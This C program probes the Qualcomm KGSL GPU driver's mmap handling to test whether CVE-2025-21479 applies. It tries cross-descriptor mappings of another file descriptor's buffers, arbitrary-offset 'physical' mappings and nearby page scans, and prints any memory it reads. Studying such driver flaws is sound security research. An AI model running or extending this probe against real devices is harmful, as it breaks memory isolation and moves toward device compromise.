/*
 * kgsl_mmap_probe.c - Deep KGSL mmap Behavior Analysis
 *
 * Test all mmap behaviors to understand CVE-2025-21479 applicability
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapaddr;
    uint64_t id;
    uint64_t metadata_len;
    uint64_t metadata;
};

#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_GPUOBJ_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

const char *errno_name(int e)
{
    switch (e)
    {
    case EINVAL:
        return "EINVAL";
    case ERANGE:
        return "ERANGE";
    case ENOENT:
        return "ENOENT";
    case ENOMEM:
        return "ENOMEM";
    case EACCES:
        return "EACCES";
    case EBADF:
        return "EBADF";
    case EPERM:
        return "EPERM";
    case EFAULT:
        return "EFAULT";
    default:
        return "OTHER";
    }
}

int main(void)
{
    printf("=== KGSL mmap Deep Probe ===\n\n");

    /* Open two FDs */
    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);

    if (fd1 < 0 || fd2 < 0)
    {
        perror("open");
        return 1;
    }

    printf("[+] FD1=%d, FD2=%d\n\n", fd1, fd2);

    /* Allocate buffers on FD1 */
    struct kgsl_gpuobj_alloc allocs[4];
    memset(allocs, 0, sizeof(allocs));

    uint64_t sizes[] = {0x1000, 0x10000, 0x100000, 0x1000000};

    for (int i = 0; i < 4; i++)
    {
        allocs[i].size = sizes[i];
        allocs[i].flags = 0x00100000;

        if (ioctl(fd1, IOCTL_KGSL_GPUOBJ_ALLOC, &allocs[i]) < 0)
        {
            printf("[-] Alloc %d failed: %s\n", i, strerror(errno));
            continue;
        }
        printf("[+] Alloc %d: size=0x%llx mmapaddr=0x%llx id=%llu\n",
               i, (unsigned long long)sizes[i],
               (unsigned long long)allocs[i].mmapaddr,
               (unsigned long long)allocs[i].id);
    }

    printf("\n=== Test 1: Same-FD mmap (legitimate) ===\n");
    for (int i = 0; i < 4; i++)
    {
        if (allocs[i].id == 0)
            continue;

        void *mem = mmap(NULL, allocs[i].size, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd1, allocs[i].mmapaddr);
        if (mem == MAP_FAILED)
        {
            printf("  Alloc %d: FAIL (%s)\n", i, errno_name(errno));
        }
        else
        {
            uint64_t *ptr = (uint64_t *)mem;
            ptr[0] = 0xCAFEBABEDEADBEEFULL;
            printf("  Alloc %d: OK @ %p, wrote test pattern\n", i, mem);
            munmap(mem, allocs[i].size);
        }
    }

    printf("\n=== Test 2: Cross-FD mmap (CVE-2025-21479) ===\n");
    for (int i = 0; i < 4; i++)
    {
        if (allocs[i].id == 0)
            continue;

        /* Use FD2 with FD1's mmapaddr */
        void *mem = mmap(NULL, allocs[i].size, PROT_READ,
                         MAP_SHARED, fd2, allocs[i].mmapaddr);
        if (mem == MAP_FAILED)
        {
            printf("  Alloc %d: FAIL (%s) - Cross-FD blocked\n",
                   i, errno_name(errno));
        }
        else
        {
            uint64_t *ptr = (uint64_t *)mem;
            printf("  Alloc %d: SUCCESS @ %p, data=0x%016llx\n",
                   i, mem, (unsigned long long)ptr[0]);
            munmap(mem, allocs[i].size);
        }
    }

    printf("\n=== Test 3: Arbitrary offset mmap (physical probe) ===\n");
    uint64_t test_offsets[] = {
        0x0,
        0x1000,
        0x2000,
        0x3000,
        0x4000,
        0x5000,
        0x10000,
        0x20000,
        0x100000,
        0x200000,
        0x400000, // Matches mmapaddr pattern
        0x800000,
        0x1000000,
        0x40000000,
        0x80000000,
        0xFFFFFFFF,
    };

    for (int i = 0; i < sizeof(test_offsets) / sizeof(test_offsets[0]); i++)
    {
        uint64_t off = test_offsets[i];

        void *mem = mmap(NULL, 0x1000, PROT_READ,
                         MAP_SHARED, fd2, off);
        if (mem == MAP_FAILED)
        {
            printf("  0x%012llx: %s (errno=%d)\n",
                   (unsigned long long)off, errno_name(errno), errno);
        }
        else
        {
            uint64_t *ptr = (uint64_t *)mem;
            printf("  0x%012llx: SUCCESS data=0x%016llx\n",
                   (unsigned long long)off, (unsigned long long)ptr[0]);
            munmap(mem, 0x1000);
        }
    }

    printf("\n=== Test 4: Page-aligned scan near allocated buffer ===\n");
    if (allocs[0].mmapaddr)
    {
        uint64_t base = allocs[0].mmapaddr;
        printf("  Base mmapaddr: 0x%llx\n", (unsigned long long)base);

        for (int delta = -5; delta <= 5; delta++)
        {
            uint64_t off = base + (delta * 0x1000);
            if (off > 0xFFFFFFFF00000000ULL)
                continue; // Overflow check

            void *mem = mmap(NULL, 0x1000, PROT_READ,
                             MAP_SHARED, fd2, off);
            if (mem == MAP_FAILED)
            {
                printf("  base%+d (0x%llx): %s\n",
                       delta, (unsigned long long)off, errno_name(errno));
            }
            else
            {
                uint64_t *ptr = (uint64_t *)mem;
                printf("  base%+d (0x%llx): SUCCESS data=0x%016llx\n",
                       delta, (unsigned long long)off, (unsigned long long)ptr[0]);
                munmap(mem, 0x1000);
            }
        }
    }

    printf("\n=== Test 5: mmap flags variations ===\n");
    if (allocs[0].mmapaddr)
    {
        uint64_t off = allocs[0].mmapaddr;
        int flags_to_try[] = {
            MAP_SHARED,
            MAP_PRIVATE,
            MAP_SHARED | MAP_POPULATE,
            MAP_SHARED | MAP_LOCKED,
        };
        const char *flag_names[] = {
            "SHARED", "PRIVATE", "SHARED|POPULATE", "SHARED|LOCKED"};

        for (int i = 0; i < 4; i++)
        {
            void *mem = mmap(NULL, 0x1000, PROT_READ,
                             flags_to_try[i], fd2, off);
            if (mem == MAP_FAILED)
            {
                printf("  %s: %s\n", flag_names[i], errno_name(errno));
            }
            else
            {
                printf("  %s: SUCCESS\n", flag_names[i]);
                munmap(mem, 0x1000);
            }
        }
    }

    printf("\n=== Test 6: Check /dev/kgsl-3d0 mmap implementation ===\n");
    /* Read kernel log for hints */
    printf("[*] Run 'dmesg | grep -i kgsl' for kernel messages\n");

    close(fd1);
    close(fd2);

    printf("\n=== Done ===\n");
    return 0;
}
